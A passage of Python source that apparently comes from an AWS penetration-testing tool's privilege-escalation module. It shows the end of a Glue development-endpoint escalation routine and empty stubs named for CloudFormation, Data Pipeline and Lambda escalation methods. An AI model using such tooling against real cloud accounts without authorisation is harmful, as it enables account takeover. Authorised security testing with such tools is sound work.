            print('  The hostname for this development endpoint was already stored in this session: {}'.format(dev_endpoints[int(choice) - 1]['PublicAddress']))
    except Exception as e:
        print('    Failed to update Glue Development Endpoint {}:\n{}'.format(endpoint_name, e))
        again = input('    Do you want to try again with a different development endpoint (y) or continue to the next privilege escalation method (n)? ')
        if again == 'y':
            print('      Re-running UpdateExistingGlueDevEndpoint privilege escalation attempt...')
            return UpdateExistingGlueDevEndpoint(pacu_main, print, input, fetch_data)
        else:
            return False
    return True


def PassExistingRoleToCloudFormation(pacu_main, print, input, fetch_data):
    return


def PassExistingRoleToNewDataPipeline(pacu_main, print, input, fetch_data):
    return


def EditExistingLambdaFunctionWithRole(pacu_main, print, input, fetch_data):
    return
